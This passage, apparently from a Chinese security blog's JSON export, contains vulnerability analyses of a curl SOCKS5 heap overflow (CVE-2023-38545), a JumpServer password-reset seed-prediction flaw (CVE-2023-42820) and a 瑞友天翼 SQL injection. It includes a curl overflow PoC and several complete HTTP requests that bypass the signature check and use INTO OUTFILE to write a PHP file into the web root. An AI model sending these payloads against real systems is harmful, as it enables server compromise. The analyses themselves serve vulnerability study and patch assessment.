socks.c:1067 #6 0x00007ffff7f4a3f1 in socks_proxy_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at socks.c:1149 #7 0x00007ffff7ed6635 in Curl_conn_cf_connect (cf=0x5555555e6428, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at cfilters.c:296 #8 0x00007ffff7edaa4d in cf_setup_connect (cf=0x5555555e6348, data=0x5555555e6ef8, blocking=0x0, done=0x7fffffffb667) at connect.c:1201 #9 0x00007ffff7ed68a1 in Curl_conn_connect (data=0x5555555e6ef8, sockindex=0x0, blocking=0x0, done=0x7fffffffb667) at cfilters.c:351 #10 0x00007ffff7f276b7 in multi_runsingle (multi=0x5555555dd868, nowp=0x7fffffffb6f0, data=0x5555555e6ef8) at multi.c:2106 #11 0x00007ffff7f28d94 in curl_multi_perform (multi=0x5555555dd868, running_handles=0x7fffffffb754) at multi.c:2742 #12 0x00007ffff7eeb1e6 in easy_transfer (multi=0x5555555dd868) at easy.c:682 #13 0x00007ffff7eeb3d4 in easy_perform (data=0x5555555e6ef8, events=0x0) at easy.c:772 #14 0x00007ffff7eeb40c in curl_easy_perform (data=0x5555555e6ef8) at easy.c:791 #15 0x000055555557a1f3 in serial_transfers (global=0x7fffffffb900, share=0x5555555d9f08) at tool_operate.c:2479 #16 0x000055555557a7c1 in run_all_transfers (global=0x7fffffffb900, share=0x5555555d9f08, result=CURLE_OK) at tool_operate.c:2670 #17 0x000055555557ab6c in operate (global=0x7fffffffb900, argc=0x7, argv=0x7fffffffba98) at tool_operate.c:2786 #18 0x00005555555710f8 in main (argc=0x7, argv=0x7fffffffba98) at tool_main.c:274 让我们把代码放在一起看，在do_SOCKS5函数中，将 sx-\u0026gt;outstanding赋值为2，尝试调用 socks_state_recv从TCP sock中读取两个字节的数据，经过层层调用最终进入到 nw_in_read函数中，调用recv函数从sock中读取数据。\npresult = socks_state_recv(cf, sx, data, CURLPX_RECV_CONNECT, \u0026#34;initial SOCKS5 response\u0026#34;); if(CURLPX_OK != presult) return presult; else if(sx-\u0026gt;outstanding) { /* remain in reading state */ return CURLPX_OK; } static CURLproxycode socks_state_recv(struct Curl_cfilter *cf, ..... { ssize_t nread; CURLcode result; nread = Curl_conn_cf_recv(cf-\u0026gt;next, data, (char *)sx-\u0026gt;outp, sx-\u0026gt;outstanding, \u0026amp;result); ...... sx-\u0026gt;outstanding -= nread; return CURLPX_OK; } ssize_t Curl_conn_cf_recv(struct Curl_cfilter *cf, struct Curl_easy *data, { if(cf) return cf-\u0026gt;cft-\u0026gt;do_recv(cf, data, buf, len, err); *err = CURLE_RECV_ERROR; return -1; } static ssize_t cf_socket_recv(struct Curl_cfilter *cf, struct Curl_easy *data, char *buf, size_t len, CURLcode *err) { struct cf_socket_ctx *ctx = cf-\u0026gt;ctx; curl_socket_t fdsave; ssize_t nread; *err = CURLE_OK; fdsave = cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex]; cf-\u0026gt;conn-\u0026gt;sock[cf-\u0026gt;sockindex] = ctx-\u0026gt;sock; ...... else { nread = nw_in_read(\u0026amp;rctx, (unsigned char *)buf, len, err); ...... return nread; } static ssize_t nw_in_read(void *reader_ctx, unsigned char *buf, size_t len, CURLcode *err) { struct reader_ctx *rctx = reader_ctx; struct cf_socket_ctx *ctx = rctx-\u0026gt;cf-\u0026gt;ctx; ssize_t nread; *err = CURLE_OK; nread = sread(ctx-\u0026gt;sock, buf, len); ...... return nread; } #define sread(x,y,z) (ssize_t)recv((RECV_TYPE_ARG1)(x), \\ (RECV_TYPE_ARG2)(y), \\ (RECV_TYPE_ARG3)(z), \\ (RECV_TYPE_ARG4)(0)) 根据RFC1928，服务器会在客户端发送hello包之后返回，选择通信方法后返回server hello client hello server hello 正常情况下，socks服务器返回server hello之后，socks_state_recv读取了两个字节的数据并通过 sx-\u0026gt;outstanding -= nread;使得outstanding=0，之后在状态机内会继续处理socks连接。\n但如果攻击者可控socks服务器，并强迫在服务器在client 发送hello之后，过了client 设置的sock timeout在返回数据包的话会怎么样？ recv函数如果在setsockopt设置的超时时间内还没有从TCP连接读取到数据的话，则会返回-1，并且err被设置为CURLE_AGAIN ，在 socks_state_recv函数中因为读取到的nread=-1，所以这个函数返回CURLPX_OK。\n返回到状态机中，presult=CURLPX_OK，sx-\u0026gt;outstanding=2，do_SOCKS5函数返回CURLPX_OK，因为没读数据，所以在easy.c中会继续循环。\nstatic CURLcode easy_transfer(struct Curl_multi *multi) { bool done = FALSE; CURLMcode mcode = CURLM_OK; CURLcode result = CURLE_OK; while(!done \u0026amp;\u0026amp; !mcode) { int still_running = 0; mcode = curl_multi_poll(multi, NULL, 0, 1000, NULL); if(!mcode) mcode = curl_multi_perform(multi, \u0026amp;still_running); /* only read \u0026#39;still_running\u0026#39; if curl_multi_perform() return OK */ if(!mcode \u0026amp;\u0026amp; !still_running) { int rc; CURLMsg *msg = curl_multi_info_read(multi, \u0026amp;rc); if(msg) { result = msg-\u0026gt;data.result; done = TRUE; } } } /* Make sure to return some kind of error if there was a multi problem */ if(mcode) { result = (mcode == CURLM_OUT_OF_MEMORY) ? CURLE_OUT_OF_MEMORY : /* The other multi errors should never happen, so return something suitably generic */ CURLE_BAD_FUNCTION_ARGUMENT; } return result; } 此时socks服务器返回数据的话，再次进入到do_SOCKS5函数，此时在函数开头socks5_resolve_local=false，进入到状态机中，由于此时状态不再是CONNECT_SOCKS_INIT，所以socks5_resolve_local不会被设置为true，此时在状态CONNECT_REQ_INIT时，状态机会跳转到状态CONNECT_RESOLVE_REMOTE，也就是curl尝试让socks服务器进行DNS解析并请求。\nunsigned char *socksreq = (unsigned char *)data-\u0026gt;state.buffer; const size_t hostname_len = strlen(sx-\u0026gt;hostname); CONNECT_RESOLVE_REMOTE: case CONNECT_RESOLVE_REMOTE: /* Authentication is complete, now specify destination to the proxy */ len = 0; socksreq[len++] = 5; /* version (SOCKS5) */ socksreq[len++] = 1; /* connect */ socksreq[len++] = 0; /* must be zero */ if(!socks5_resolve_local) { ...... memcpy(\u0026amp;socksreq[len], sx-\u0026gt;hostname, hostname_len); /* w/o NULL */ ...... } /* FALLTHROUGH */ 此时curl会尝试将主机名通过memcpy拷贝到tcp 请求体中，而socksreq指向的内存由Curl_preconnect分配\nCURLcode Curl_preconnect(struct Curl_easy *data) { if(!data-\u0026gt;state.buffer) { data-\u0026gt;state.buffer = malloc(data-\u0026gt;set.buffer_size + 1); if(!data-\u0026gt;state.buffer) return CURLE_OUT_OF_MEMORY; } return CURLE_OK; } 在我的环境中可以看到最终的内存大小为0x8ce+1\ngef➤ p data.set.buffer_size $12 = 0x8ce gef➤ 所以如果构造大于这个大小的hostname，在memcpy时就可以触发堆溢出。\nPoC\ncurl --location --limit-rate 2254B --socks5-hostname 192.168.32.1:10808 $(python3 -c \u0026#34;print(\u0026#39;A\u0026#39;*10000,end=\u0026#39;\u0026#39;)\u0026#34;) 小结 在修复代码中，如果hostname超过255则会直接返回错误，而不再访问后面的状态机，直接阻断了调用链。虽然url的hostname没有长度规定，可以超过1024，但由于DNS解析最大只支持255字节的域名，所以在正常请求中不应该出现域名大于255的情况，从这个角度看此次修复方式也很合理。\n从利用角度看这个漏洞，攻击者需要可以控制curl或libcurl使用的socks5代理，还需要控制传递给curl和libcurl的url，而后才能触发漏洞，表面看攻击者可以控制溢出的范围和内容，很可能通过堆溢出造成代码执行。但curl会通过url parser去验证url有效性，如果url无效则会产生错误，因此只当url合法时才会触发漏洞，也就是攻击者构造的url只能是ASCII字符的子集，综合上面的条件，这个漏洞利用难度极大，造成代码执行的几率很小。\n考虑到大部分软件即使能控制url，但也不能控制让libcurl使用socks5代理，所以可以择期修复这个漏洞。\n题外话 这个漏洞还让curl的作者难过了一下：It burns in my soul. 作者说，如果使用内存安全的语言重写curl的话，那这些漏洞就不会存在，当然在可预见的未来curl还是会用c开发，但目前可行的办法是逐渐使用内存安全的依赖项替代。\n参考链接\nhttps://curl.se/docs/CVE-2023-38545.html\nhttps://daniel.haxx.se/blog/2023/10/11/how-i-made-a-heap-overflow-in-curl/\nhttps://hackerone.com/reports/2187833\nhttps://datatracker.ietf.org/doc/html/rfc1928\nCreated at 2023-10-11T20:40:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/","title":"CVE-2023-4863 Libwebp Rce 分析","tags":["漏洞分析"],"description":"","content":"Created at 2023-10-07T10:23:56+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/","title":"CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 jumpserver中第三方库向用户公开了随机库所用的seed，并且没有限制重置密码接口的次数，导致攻击者可以获取到随机库的随机种子并尝试预测重置密码的验证码，进而重置任意用户密码。 利用该漏洞需要已知用户名和对应的邮箱。\n指纹 hunter\nweb.title=\u0026#34;jumpserver\u0026#34; 影响版本 CVE-2023-42820 v2.24 - v3.6.4 环境搭建 参考\rhttps://github.com/jumpserver/Dockerfile，将版本改为3.6.4，使用docker启动即可。\n技术分析\u0026amp;调试 补丁分析 漏洞在commit 0eba6d2175ab752399c5aee2dbaaf311bf0a398d修复，查看补丁，可知在apps/common/utils/random.py#random_string处增加了 random.seed()调用，同时对 apps/users/models/user.py#generate_reset_token生成token改为增加了 random.seed调用的random_string函数 到这里只能隐约猜到是一个密码学有关的漏洞，应该可以通过爆破利用。\n技术分析 在前两天有师傅写出了分析，才恍然大悟。\n根据\rjumpserver最新re-auth复现（伪随机经典案例）可知在本例的jumpserver中在如下地方生成重置密码时的验证码，其中使用了本次修复的函数 random_string生成6位，范围为000000-999999的数字验证码\nopt/jumpserver/apps/authentication/api/password.py def create(self, request, *args, **kwargs): token = request.GET.get(\u0026#39;token\u0026#39;) userinfo = cache.get(token) if not userinfo: return HttpResponseRedirect(reverse(\u0026#39;authentication:forgot-previewing\u0026#39;)) serializer = self.get_serializer(data=request.data) serializer.is_valid(raise_exception=True) username = userinfo.get(\u0026#39;username\u0026#39;) form_type = serializer.validated_data[\u0026#39;form_type\u0026#39;] code = random_string(6, lower=False, upper=False) with open(\u0026#34;/tmp/code\u0026#34;,\u0026#34;a\u0026#34;) as f: f.write(code+\u0026#34;\\n\u0026#34;) other_args = {} target = serializer.validated_data[form_type] if form_type == \u0026#39;sms\u0026#39;: query_key = \u0026#39;phone\u0026#39; target = target.lstrip(\u0026#39;+\u0026#39;) else: query_key = form_type user, err = self.is_valid_user(username=username, **{query_key: target}) if not user: return Response({\u0026#39;error\u0026#39;: err}, status=400) subject = \u0026#39;%s: %s\u0026#39; % (get_login_title(), _(\u0026#39;Forgot password\u0026#39;)) context = { \u0026#39;user\u0026#39;: user, \u0026#39;title\u0026#39;: subject, \u0026#39;code\u0026#39;: code, } message = render_to_string(\u0026#39;authentication/_msg_reset_password_code.html\u0026#39;, context) other_args[\u0026#39;subject\u0026#39;], other_args[\u0026#39;message\u0026#39;] = subject, message SendAndVerifyCodeUtil(target, code, backend=form_type, **other_args).gen_and_send_async() return Response({\u0026#39;data\u0026#39;: \u0026#39;ok\u0026#39;}, status=200) 在大学学习c语言的rand函数时，如果不对其显式使用srand函数播种的话，则每次运行程序随机出来的结果是一样的，因为rand使用的种子在计算机启动时就不会再变化了，所以我们要使用srand函数产生种子并进行播种，来使得rand函数的结果不一样。 实际上计算机中的随机数不是真正的随机数，而是伪随机数，计算机根据传入的种子经过某些运算得出结果。 对于一个进程，随机的种子确定则随机数也确定。 这个规律在python中也一样，对于同样的seed及同样的随机次数，一定会生成同样的数字。\nPython 3.11.4 (tags/v3.11.4:d2340ef, Jun 7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32 Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 ➜ chestnut python3 Python 3.11.4 (main, Jun 7 2023, 10:13:09) [GCC 12.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; random.seed(1010) \u0026gt;\u0026gt;\u0026gt; random.random() 0.6710054770408643 \u0026gt;\u0026gt;\u0026gt; 虽然我们现在知道了这个漏洞应该源于伪随机数，但我们如果没办法获取到随机时所设置的种子，也没办法预测随即结果。\n下面就是这个漏洞的精华所在，根据文章所述。 django使用了第三方库djiango-simple-captcha库来生成验证码，在这个库生成的时候会有如下逻辑： 在usr/local/lib/python3.11/site-packages/captcha/views.py$captcha_image中，通过传入的key设置random.seed()，而传入的key则是浏览器向后端请求图片的路径，下图的key为 c83d66ac7dca7e2189ad17a9a3e532f2e87d5c07\ndef captcha_image(request, key, scale=1): if scale == 2 and not settings.CAPTCHA_2X_IMAGE: raise Http404 try: store = CaptchaStore.objects.get(hashkey=key) except CaptchaStore.DoesNotExist: # HTTP 410 Gone status so that crawlers don\u0026#39;t index these expired urls. return HttpResponse(status=410) random.seed(key) # Do not generate different images for the same key text = store.challenge 也就是我们可以通过图片的url间接知道jumpserver随机时所使用的种子，也就是说，通过图片地址我们可以获取到种子，如果生成验证码时所在的进程和这个生成图片验证码的进程在同一个进程，那么我们就可以通过获取到的种子和使用jumpserver生成验证码的算法来预测jumpserver生成重置密码的验证码。 这样我们可以在很少的时间（次数）内预测到重置密码的验证码，进而重置密码。 但仅仅这么简单吗？在jumpserver中使用了 gunicorn，它会使用master进程fork worker进程，处理用户请求，所以即使我们通过单次的图片请求获取到了random的种子，处理重置密码请求的进程可能不是被获取到种子的进程，这样预测出来的验证码和重置密码时生成的不会一样。\n➜ chestnut docker top 808b | grep python root 5704 5674 0 11:08 ? 00:00:02 python jms start web root 5864 5704 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/celery -A ops flower -logging=info --url_prefix=/core/flower --auto_refresh=False --max_tasks=1000 --state_save_interval=600000 root 5865 5704 0 11:08 ? 00:00:00 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5867 5865 0 11:08 ? 00:00:01 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5868 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5873 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - root 5874 5865 0 11:08 ? 00:00:02 /usr/local/bin/python /usr/local/bin/gunicorn jumpserver.asgi:application -b 0.0.0.0:8080 -k uvicorn.workers.UvicornWorker -w 4 --max-requests 10240 --max-requests-jitter 2048 --access-logformat %(h)s %(t)s %(L)ss \u0026#34;%(r)s\u0026#34; %(s)s %(b)s --access-logfile - 在文章中提到可以有两种办法：\n并发同时发送多个请求，通过大量请求使得每个gunicorn进程都会接收到图片验证码的请求，从而将所有进程的seed设置为同一个种子，这样后续重置密码时无论哪个进程接收到的请求，该进程的seed都是已知的。 通过某种办法将gunicorn打挂，并监测服务状态，当服务响应码从502变为200时，说明进程恢复正常，这时通过少量请求即可将所有目标进程的seed设置为我们已知的值。 并发发送大量请求让我想起了k8s环境中，pod切换IP的场景， 时间比较紧（太笨了），没看出来哪里可以造成crash，在使用第一种办法的时候，发现会有些许问题\n在发送几千个请求之后，通过图片验证码请求触发重置密码时，后端会返回这个验证码不正确 在发送请求之后，经过测试使用seed生成和jumpserver相同的code需要经过几万次 所以在这里讨巧，手动重启core container（模拟crash了gunicorn的场景），而后通过请求验证码图片设置seed，经过测试成功的次数范围为200+，即成功生成和jumpserver一样的重置密码验证码需要random两百多次。\n小结 回过头看文章所说的 随机深度，按照我的理解就是在生成code时，所在进程已经random了几次，随机次数越多，预测时所要的次数也就越多，因为相同的seed经过相同的次数生成的随机数是一样的，在生成验证码和random_string函数中均有多次使用random类函数生成随机数，所以才需要循环计算进行碰撞。 在漏洞利用过程中，除了前面说的覆盖seed的问题，jumpserver还会验证请求url里面的token以及POST的body里面需要携带csrf token，这些都可以通过url解析以及xpath从请求响应中获取到。在一个就是生成重置密码验证码后，这个验证码有60秒有效期，过了60秒之后再去碰撞后端会返回验证码已过期，需要重新生成。 在有个问题就是图片验证码涉及到数学运算，粗略看来验证码应该可以通过ocr库进行识别并计算，实现自动化获取图片地址、设置seed、计算验证码等，这个只能等节后仔细研究了。\n参考链接\nhttps://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp\nhttps://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw\n创建于2023-09-28\nCreated at 2023-09-29T20:32:52+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/","title":"瑞友天翼 Rce分析","tags":["漏洞分析"],"description":"","content":"基本信息 瑞友天翼中存在SQL注入漏洞，攻击者可以利用SQL注入写入webshell，控制目标服务器。\n环境搭建 略\n影响版本 略\n技术分析 数据库基本信息\n127.0.0.1:5873 db: CASSystemDS pwd: F1B5214C user: admin 在ConsoleExternalApi.XGI中根据代码逻辑可得，请求中需携带initparams、key、sign等参数\n$initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; 参数校验逻辑如下，此时直接使用key=inner绕过判断，则$keyVal值为Realor，下面拼接了$initparams和$keyVal并计算其md5值是否和sign变量相同。\nif ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;key值为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数加密方法错误\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } 之后使用两个下划线分割$initparams变量，存入数组并遍历数组\n// 两个下划线分割，变成一个数组，之后遍历数组，用一个下划线分割并变成键值对存入$requestObj变量中。 $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); if (count($paramArr) == 0) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数中未包含__\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法11\u0026#39;); } $requestObj = null; //testLog($paramArr); foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } 之后从键值对数组中取出键为command的值，进行判断 $cmd = $requestObj['command']; 当$cmd为createUser时，从请求中取出POST body并尝试进行json decode，从中取出键为account的值拼接到sql语句中进行查询，此时可以使用单引号进行sql注入，借助union select into outfile语句写入webshell，达成代码执行。\nif ($cmd == \u0026#34;createUser\u0026#34;) { $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $fId = getDefaultVal($POST_JSON[\u0026#39;userGroupId\u0026#39;], getAdminGroupId()); $account = $POST_JSON[\u0026#39;account\u0026#39;]; if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户账户不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户账号不可为空\u0026#39;); } $account = utf8ToGbk($account); $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户密码不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户密码不可为空\u0026#39;); } //账号是否已存在 $result = mysql_query(\u0026#34;select * from cuser where name=\u0026#39;\u0026#34; . $account . \u0026#34;\u0026#39;\u0026#34;, $DSCon); PoC\nGET /index.php/Index/dologin?name=aa\u0026#39;);SELECT%20%22%3C?php%20phpinfo();?%3E%22%20into%20outfile%20%22../../WebRoot/1.php%22;\u0026#39; HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close 最新版poc\nPOST /ConsoleExternalApi.XGI?initParams=command_createUser\u0026amp;key=inner\u0026amp;sign=8b21270d796c45333f88f7db36ed9dbe HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 170 {\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_importUsers\u0026amp;key=inner\u0026amp;sign=ec7e8f5769c2455b773600c2912216fd HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 183 {\u0026#34;users\u0026#34;:[{\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;userPwd\u0026#34;:\u0026#34;bbb\u0026#34;}]} POST /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010\u0026amp;key=inner\u0026amp;sign=dd1d23cb85d99349f2ab003c73df331f HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 174 {\u0026#34;userGroupId\u0026#34;:\u0026#34;aa\u0026#34;,\u0026#34;account\u0026#34;:\u0026#34;aaa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer\u0026amp;key=inner\u0026amp;sign=a3efd6862f5d11319c6de783b58ff04a HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 142 {\u0026#34;serverId\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;pointNUm\u0026#34;:\u0026#34;aaa\u0026#34;,\u0026#34;maximumConcurrentNUm\u0026#34;:\u0026#34;aa\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_getServerIpPort\u0026amp;key=inner\u0026amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 89 {\u0026#34;iP\u0026#34;:\u0026#34;aa\u0026#39; union select 0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_publishApp\u0026amp;key=inner\u0026amp;sign=74ed1f0c20a444c561294b4939b206dc HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 100 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select \\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;a\u0026#34;} POST /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002\u0026amp;key=inner\u0026amp;sign=f25574d747ffbbd51496015d25438fa9 HTTP/1.1 Cache-Control: no-cache User-Agent: sqlmap/1.5.8#stable (http://sqlmap.org) Cookie: PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn Host: 192.168.60.135 Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 223 {\u0026#34;name\u0026#34;:\u0026#34;aa\u0026#39; union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\\\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\\\u0026#34; into outfile \\\u0026#34;../../WebRoot/1.php\\\u0026#34;;#\u0026#34;} 代码逻辑：\n// 传入参数initParams key sign $initparams = $_REQUEST[\u0026#39;initParams\u0026#39;]; $key = $_REQUEST[\u0026#39;key\u0026#39;]; $sign = $_REQUEST[\u0026#39;sign\u0026#39;]; // 两个下划线分割$initparams，变成一个数组 $paramArr = explode(\u0026#34;__\u0026#34;, $initparams); // 设置key inner if ($key == \u0026#34;wusuokey\u0026#34;) { $keyVal = $COMCASWEB-\u0026gt;getfarminfo($key); } else if ($key == \u0026#34;inner\u0026#34;) { $keyVal = \u0026#34;Realor\u0026#34;; } if (!isset($keyVal) || empty($keyVal)) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;key值为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $signCalculate = md5($initparams . $keyVal); //testLog(\u0026#34;signCalculate=\u0026#34; . $signCalculate); if ($signCalculate != $sign) { write_log(\u0026#34;{\u0026#39;参数非法\u0026#39;:\u0026#39;参数加密方法错误\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;参数非法\u0026#39;); } $requestObj = null; //testLog($paramArr); // command_createuser // 遍历数组，将数组的每一项通过_分割，变成键值对 foreach ($paramArr as $key =\u0026gt; $value) { $keyValue = explode(\u0026#34;_\u0026#34;, $value); $requestObj[$keyValue[0]] = $keyValue[1]; } // 获取command对应的值 $cmd = $requestObj[\u0026#39;command\u0026#39;]; if ($cmd == \u0026#34;createUser\u0026#34;) { // 从请求中获取json数据并decode $POST_JSON = json_decode($HTTP_RAW_POST_DATA, true); $account = $POST_JSON[\u0026#39;account\u0026#39;]; // 这里要保证请求的json数据里面有account if (!isset($account) || empty($account)) { write_log(\u0026#34;{\u0026#39;createUser\u0026#39;:\u0026#39;用户账户不可为空\u0026#39;}\u0026#34;); exitErrorJson(\u0026#39;用户账号不可为空\u0026#39;); } $account = utf8ToGbk($account); // 这里要保证请求的json数据里面有userPwd $userPwd = $POST_JSON[\u0026#39;userPwd\u0026#39;]; if (!isset($userPwd) || empty($userPwd)) { 